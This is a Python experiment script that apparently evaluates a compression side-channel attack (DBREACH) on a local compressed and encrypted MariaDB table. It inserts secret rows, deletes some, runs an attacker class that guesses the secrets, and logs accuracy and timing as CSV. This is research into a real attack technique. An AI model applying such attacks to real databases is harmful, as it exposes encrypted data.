import utils.mariadb_utils as utils
import dbreacher
import dbreacher_impl
import decision_attacker
import random
import string
import time
import sys

maxRowSize = 200

control = utils.MariaDBController("testdb")

table = "victimtable"
control.drop_table(table)
control.create_basic_table(table,
            varchar_len=maxRowSize,
        compressed=True,
        encrypted=True)

#print("Reading in all guesses... \n")
possibilities = []
if sys.argv[1] == "--random":
    for _ in range(2000):
        size = np.random.randint(10, 20)
        secret = "".join(random.choices(string.ascii_lowercase, k=size))
        possibilities.append(secret)
if sys.argv[1] == "--english":
    with open("../resources/10000-english-long.txt") as f:
        for line in f:
            word = line.strip().lower()
            possibilities.append(word)
if sys.argv[1] == "--emails":
    with open("../res/fake-emails.txt") as f:
        for line in f:
            email = line.strip().lower()
            possibilities.append(email)
'''
np.random.shuffle(possibilities)
for idx, s in enumerate(possibilities):
    old_size = control.get_table_size(table)
    control.insert_row(table, idx, s)
    new_size = control.get_table_size(table)
    if old_size < new_size:
        print("Table grew after " + str(idx + 1) + " insertions")
        assert(False)
'''
print("deleted,true_label,num_secrets,b_no,b_guess,b_yes,setup_time,per_guess_time")

secrets_to_try = [1, 20, 40, 60, 80, 100, 120, 140, 160, 180, 200, 220, 240]
# secrets_to_try = [20]
secrets_to_try.reverse()
for num_secrets in secrets_to_try:
    random.shuffle(possibilities)
    for trial in range(0, 200, num_secrets):
        success = False
        control.drop_table(table)
        control.create_basic_table(table,
            varchar_len=maxRowSize,
            compressed=True,
            encrypted=True)
        guesses = []
        correct_guesses = set()
        for secret_idx in range(num_secrets):
            secret = possibilities[(trial + secret_idx) % len(possibilities)]
            control.insert_row(table, secret_idx, secret)
            guesses.append(secret)
            correct_guesses.add(secret)

        for secret_idx in range(num_secrets, num_secrets*2):
            wrong_guess = possibilities[(trial + secret_idx) % len(possibilities)]
            guesses.append(wrong_guess)

        fillerCharSet = string.printable.replace(string.ascii_lowercase, '').replace('*', '')
        if sys.argv[1] == "--emails":
            fillerCharSet = fillerCharSet.replace('_', '').replace('.', '').replace('@', '')
        dbreacher = dbreacher_impl.DBREACHerImpl(control, table, num_secrets, maxRowSize, fillerCharSet, ord('*'))

        deleted_guesses = []
        for i in range(len(correct_guesses)//2):
            guess_len = len(list(correct_guesses)[i])
            # temp_str = '.' * guess_len
            # control.update_row(table, i, temp_str)
            control.delete_guess(table, list(correct_guesses)[i])
            deleted_guesses.append(list(correct_guesses)[i])

        attacker = decision_attacker.decisionAttacker(dbreacher, guesses)
        while not success:
            #print("Setting up trial " + str(trial))
            #control.drop_table(table)
            #control.create_basic_table(table,
            #    varchar_len=maxRowSize,
            #    compressed=True,
            #    encrypted=True)
            '''
            guesses = []
            correct_guesses = set()
            for secret_idx in range(num_secrets):
                secret = possibilities[(trial + secret_idx) % len(possibilities)]
                control.insert_row(table, secret_idx, secret)
                guesses.append(secret)
                correct_guesses.add(secret)
        
            for secret_idx in range(num_secrets, num_secrets*2):
                wrong_guess = possibilities[(trial + secret_idx) % len(possibilities)]
                guesses.append(wrong_guess)

            dbreacher = dbreacher_impl.DBREACHerImpl(control, table, num_secrets, maxRowSize, string.ascii_uppercase, ord('*'))

            attacker = decision_attacker.decisionAttacker(dbreacher, guesses)
            '''
            setupStart = time.time()
            success = attacker.setUp()
            setupEnd = time.time()
            if success:
                success = attacker.tryAllGuesses()
            end = time.time()
        #print("Setup succeeded")
        refScores = attacker.getGuessAndReferenceScores()
        for guess, score_tuple in refScores:
            label = 1 if guess in correct_guesses else 0
            deleted = 'yes' if guess in deleted_guesses else 'no'
            print(str(deleted) + ',' + str(label)+","+str(num_secrets)+","+str(score_tuple[0])+","+str(score_tuple[1])+","+str(score_tuple[2]) +","+str(setupEnd - setupStart)+","+str((end-setupEnd)/num_secrets))

